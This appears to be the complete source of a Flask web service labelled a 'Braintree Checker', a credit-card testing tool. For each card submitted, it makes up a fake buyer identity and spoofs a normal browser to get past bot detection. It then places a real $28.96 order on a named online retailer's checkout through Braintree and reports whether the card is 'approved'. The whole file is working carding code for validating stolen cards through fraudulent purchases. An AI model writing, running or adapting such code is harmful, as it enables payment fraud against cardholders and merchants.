from flask import Flask, request, jsonify
import asyncio
import base64
import json
import re
import urllib.parse
import uuid
from functools import wraps

import curl_cffi.requests
from bs4 import BeautifulSoup, Tag
from curl_cffi import CurlMime
from curl_cffi.requests import RequestsError
from fake_useragent import FakeUserAgent
from faker import Faker
from playwright.async_api import Playwright, async_playwright

app = Flask(__name__)

# Funciones auxiliares
def parse_card(card: str):
    try:
        card_number, exp_month, exp_year, cvv = re.findall(r"\d+", card)[:4]
        return card_number, exp_month, exp_year, cvv
    except IndexError:
        raise IndexError("Card format incorrect. Expected: card_number|exp_month|exp_year|cvv")


def retry_request(attempts=3, delay=2, exceptions=(Exception,)):
    def decorator(func):
        @wraps(func)
        async def wrapper(*args, **kwargs):
            last_exception = exceptions
            for attempt in range(1, attempts + 1):
                try:
                    return await func(*args, **kwargs)
                except exceptions as e:
                    last_exception = e
                    print(f"[RETRY] Attempt {attempt}/{attempts}")
                    if attempt < attempts:
                        await asyncio.sleep(delay)
            raise last_exception
        return wrapper
    return decorator


async def request_with_retry(session_method, *args, **kwargs):
    retryable = retry_request(attempts=3, delay=1, exceptions=(RequestsError, Exception))(session_method)
    return await retryable(*args, **kwargs)


def cookies_to_dict(cookies):
    jar = {}
    for c in cookies:
        jar[c["name"]] = c["value"]
    return jar


async def get_cookies(session: Playwright):
    browser = await session.chromium.launch(
        headless=True,
        args=[
            "--disable-blink-features=AutomationControlled",
            "--disable-infobars",
            "--no-sandbox",
            "--disable-dev-shm-usage",
            "--disable-gpu",
        ],
    )

    context = await browser.new_context(
        viewport={"width": 1280, "height": 800},
        user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36",
    )

    page = await context.new_page()
    
    try:
        await page.goto(
            "https://saamnpgstore.si.edu/the-four-justices-postcard",
            wait_until="networkidle",
            timeout=30000
        )
    except Exception as e:
        await browser.close()
        raise Exception(f"Couldn't get cookies: {str(e)}")

    cookies = await context.cookies()
    await browser.close()

    return cookies


async def braintree_29_usd(card: str):
    """Braintree Charge Gateway - $28.96 USD"""
    try:
        card_number, exp_month, exp_year, cvv = parse_card(card)
    except IndexError as e:
        return "declined", str(e)

    user_agent = FakeUserAgent(os=["Windows"]).chrome
    fake_us = Faker(locale="en_US")

    first_name = fake_us.first_name()
    last_name = fake_us.last_name()
    street_address = fake_us.street_address()
    city = "New York"
    state = "NY"
    zip_code = fake_us.zipcode_in_state(state)
    phone = fake_us.numerify("$0%%#$####")
    email = f"{first_name.lower()}{last_name.lower()}{fake_us.random_number(digits=3)}@{fake_us.free_email_domain()}"

    session_id = str(uuid.uuid4())

    # Get cookies using Playwright
    async with async_playwright() as session:
        cookies = await get_cookies(session=session)
        cookie_dict = cookies_to_dict(cookies)

    form_key = str(cookie_dict.get("form_key"))

    async with curl_cffi.requests.AsyncSession(impersonate="chrome", cookies=cookie_dict) as session:
        try:
            # REQ 1: Add to cart
            resp = await request_with_retry(
                session.post,
                "https://www.hamam.com/en-us/checkout/cart/add/uenc/aHR0cHM6Ly93d3cuaGFtYW0uY29tL2VuLXVzL3BhdGFyYS10b3dlbC0yMjEtMTMteHguaHRtbA%2C%2C/product/110546/",
                headers={
                    "accept": "application/json, text/javascript, */*; q=0.01",
                    "accept-encoding": "gzip, deflate",
                    "origin": "https://www.hamam.com",
                    "referer": "https://www.hamam.com/en-us/patara-towel-221-13-xx.html",
                    "user-agent": user_agent,
                    "x-requested-with": "XMLHttpRequest",
                },
                multipart=CurlMime.from_list([
                    {"name": "product", "data": "110546"},
                    {"name": "form_key", "data": form_key},
                    {"name": "super_attribute[415]", "data": "259"},
                    {"name": "super_attribute[678]", "data": "2295"},
                    {"name": "qty", "data": "1"},
                ]),
                timeout=15,
            )

            if not resp.ok:
                return "error", f"Add to cart failed: {resp.status_code}"

            # REQ 2: GET checkout
            resp = await request_with_retry(
                session.get,
                "https://www.hamam.com/en-us/checkout/",
                headers={
                    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                    "user-agent": user_agent,
                },
                timeout=15,
            )

            if not resp.ok:
                return "error", f"Checkout failed: {resp.status_code}"

            soup = BeautifulSoup(resp.text, "html.parser")
            scripts = soup.find_all("script")

            entity_id = None
            braintree_client_token = None

            for script in scripts:
                if script.getText() and "entity_id" in script.getText():
                    match = re.search(r'"entity_id"\s*:\s*"([^"]+)"', script.getText())
                    if match:
                        entity_id = match.group(1)

                    match = re.search(r'"clientToken"\s*:\s*"([^"]+)"', script.getText())
                    if match:
                        braintree_client_token = match.group(1)
                        break

            if not entity_id:
                return "error", "Entity ID not found"

            if not braintree_client_token:
                return "error", "Client token not found"

            authorization_fingerprint = json.loads(
                base64.b64decode(braintree_client_token).decode("utf-8")
            ).get("authorizationFingerprint")

            # REQ 3: Set shipping address
            resp = await request_with_retry(
                session.post,
                f"https://www.hamam.com/en-us/rest/hm_us/V1/guest-carts/{entity_id}/shipping-information",
                headers={
                    "content-type": "application/json",
                    "user-agent": user_agent,
                },
                json={
                    "addressInformation": {
                        "shipping_address": {
                            "countryId": "US",
                            "regionId": "127",
                            "regionCode": "NY",
                            "region": "New York",
                            "street": [street_address],
                            "telephone": phone,
                            "postcode": zip_code,
                            "city": city,
                            "firstname": first_name,
                            "lastname": last_name,
                        },
                        "billing_address": {
                            "countryId": "US",
                            "regionId": "127",
                            "regionCode": "NY",
                            "region": "New York",
                            "street": [street_address],
                            "telephone": phone,
                            "postcode": zip_code,
                            "city": city,
                            "firstname": first_name,
                            "lastname": last_name,
                        },
                        "shipping_method_code": "flatrate",
                        "shipping_carrier_code": "flatrate",
                    }
                },
                timeout=15,
            )

            if not resp.ok:
                return "error", f"Shipping address failed: {resp.status_code}"

            # REQ 4: Tokenize card
            resp = await request_with_retry(
                session.post,
                "https://payments.braintree-api.com/graphql",
                headers={
                    "authorization": f"Bearer {authorization_fingerprint}",
                    "braintree-version": "2018-05-10",
                    "content-type": "application/json",
                    "origin": "https://assets.braintreegateway.com",
                    "referer": "https://assets.braintreegateway.com/",
                    "user-agent": user_agent,
                },
                json={
                    "clientSdkMetadata": {
                        "source": "client",
                        "integration": "custom",
                        "sessionId": session_id,
                    },
                    "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }",
                    "variables": {
                        "input": {
                            "creditCard": {
                                "number": card_number,
                                "expirationMonth": exp_month.zfill(2),
                                "expirationYear": "20" + exp_year.zfill(2) if len(exp_year) == 2 else exp_year,
                                "cvv": cvv,
                                "billingAddress": {
                                    "postalCode": zip_code,
                                    "streetAddress": street_address,
                                },
                            },
                            "options": {"validate": False},
                        }
                    },
                    "operationName": "TokenizeCreditCard",
                },
                timeout=15,
            )

            if not resp.ok:
                return "error", f"Tokenization failed: {resp.status_code}"

            resp_json = resp.json()

            if "data" not in resp_json or not resp_json["data"].get("tokenizeCreditCard"):
                error_message = resp_json.get("errors", [{}])[0].get("message", "")
                if "Credit card number is invalid" in error_message:
                    return "declined", "Card number is invalid"
                elif "Expiration date is invalid" in error_message:
                    return "declined", "Expiration date is invalid"
                elif "CVV is invalid" in error_message:
                    return "declined", "CVV is invalid"
                else:
                    return "declined", f"Tokenization failed: {error_message}"

            tokenized_cc = resp_json["data"]["tokenizeCreditCard"]["token"]

            # REQ 5: Place order
            resp = await request_with_retry(
                session.post,
                f"https://www.hamam.com/en-us/rest/hm_us/V1/guest-carts/{entity_id}/payment-information",
                headers={
                    "content-type": "application/json",
                    "user-agent": user_agent,
                },
                json={
                    "cartId": entity_id,
                    "billingAddress": {
                        "countryId": "US",
                        "regionId": "127",
                        "regionCode": "NY",
                        "region": "New York",
                        "street": [street_address],
                        "telephone": phone,
                        "postcode": zip_code,
                        "city": city,
                        "firstname": first_name,
                        "lastname": last_name,
                    },
                    "paymentMethod": {
                        "method": "braintree",
                        "additional_data": {
                            "payment_method_nonce": tokenized_cc,
                            "device_data": f'{{"correlation_id":"{uuid.uuid4().hex}"}}',
                        },
                    },
                    "email": email,
                },
                timeout=15,
            )

            if resp.status_code == 400:
                message = resp.json().get("message", "")
                error_message = message.removeprefix(
                    "Your payment could not be taken. Please try again or use a different payment method. "
                )

                if "prohibited" in error_message.lower():
                    return "declined", "Credit card number is prohibited"
                elif "insufficient" in error_message.lower():
                    return "approved", error_message
                elif "cvv" in error_message.lower():
                    return "approved", "Card Issuer Declined CVV"

                return "declined", error_message

            elif resp.status_code == 200:
                return "approved", "Charged $28.96 USD"
            else:
                return "error", f"Payment failed: {resp.status_code}"

        except Exception as e:
            return "error", f"Exception: {str(e)}"


# Flask routes
@app.route('/', methods=['GET'])
def index():
    return jsonify({
        'api': 'Braintree Checker',
        'status': 'online',
        'endpoints': {
            'check': 'POST /check',
            'health': 'GET /health'
        }
    })


@app.route('/health', methods=['GET'])
def health():
    return jsonify({'status': 'ok'})


@app.route('/check', methods=['POST'])
def check_card_endpoint():
    data = request.get_json()
    
    if not data or 'card' not in data:
        return jsonify({
            'status': 'error',
            'message': 'Missing card parameter. Format: card_number|exp_month|exp_year|cvv'
        }), 400
    
    card = data['card']
    
    try:
        # Ejecutar el checker
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        status, message = loop.run_until_complete(braintree_29_usd(card))
        loop.close()
        
        return jsonify({
            'status': status,
            'message': message,
            'card': card[:6] + '******' + card[-4:] if '|' in card else card
        })
    
    except Exception as e:
        return jsonify({
            'status': 'error',
            'message': str(e)
        }), 500


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)
